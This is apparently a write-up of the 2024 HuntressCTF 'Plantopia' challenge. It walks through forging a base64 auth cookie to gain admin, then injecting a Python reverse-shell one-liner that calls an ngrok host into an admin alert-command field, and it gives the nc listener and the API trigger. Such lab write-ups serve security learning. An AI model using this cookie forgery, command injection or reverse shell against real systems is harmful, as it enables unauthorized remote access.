---
title: 2024 HuntressCTF - Plantopia
date: 2024-10-22T07:00:00-07:00
tags:
  - 
image: /2024-HuntressCTF/Plantopia.png
---

### Summary
```
Plantopia is our brand new, cutting edge plant care management website! Built for hobbiests and professionals alike, it's your one stop shop for all plant care management.

Please perform a penetration test ahead of our site launch and let us know if you find anything.

Username: testuser
Password: testpassword

```

### Steps

I logged into the application and noticed I had access to swagger and could perform minimal actions with the current user.  After a few minutes, I looked at the cookie assigned to me after logging in.  
```
auth=dGVzdHVzZXIuMC4xNzI5NjM2NTUw
```

This is a base64 encoded cookie which decodes as `testuser.0.1729636550`.  I changed the `0` to a `1` and encoded as base64 giving me a result of `dGVzdHVzZXIuMS4xNzI5NjM2NTUw`. I updated the cookie in my browser and refreshed the website. 

Upon doing that, I was given admin access!

![](/static/2024-HuntressCTF/p1.png)

With admin access I explored the admin panel and found there is one area where you can set an alert and run a bash command.

![](/static/2024-HuntressCTF/p2.png)

I would not able to remove `/usr/sbin/sendmail -t` as this was required.  I tested several command injection techniques but was not getting anywhere.  Next, I went over to `revshell.com` and started to create a python reverse shell.  Python was selected because of the framework of the website.  I also use Ngrok to catch the reverse shell and send it to a nc listener locally.  

![](/static/2024-HuntressCTF/p3.png)

You'll see I was issued this tcp address: `0.tcp.us-cal-1.ngrok.io:14629`.  In another terminal, I started a nc listener with `nc -nlvp 8080`.

Going back to revshell.com, I updated the host and port and got this reverse shell.
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.us-cal-1.ngrok.io",14629));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Within the vulnerable website, I input `&&` and pasted the reverse shell and saved the settings. 

![](/static/2024-HuntressCTF/p4.png)

At this time, no reverse shell was sent to my listener so I figured I would need to trigger it somehow. 

While exploring the swagger documents, I noticed an api call `/api/admin/settings`.  I copied my cookie into the Authorization field and updated the alert_command with the revers shell.  However, the request failed and I realized it was because the `"`'s were not escaped for the json request.  I updated the payload to be like this:
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"0.tcp.us-cal-1.ngrok.io\",14629));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'
```

This request saved the settings and there was one more API call to make which was to `/api/admin/sendmail`.

![](/static/2024-HuntressCTF/p5.png)

I had a feeling this reverse shell worked because the website hung for a moment.  Looking at the terminal window, I see 1 open connection!

![](/static/2024-HuntressCTF/p6.png)

I then switched to my other terminal window with nc and noticed I had a reverse shell.

![](/static/2024-HuntressCTF/p7.png)


Flag: flag{c29c4d53fc432f7caeb573a9f6eae6c6}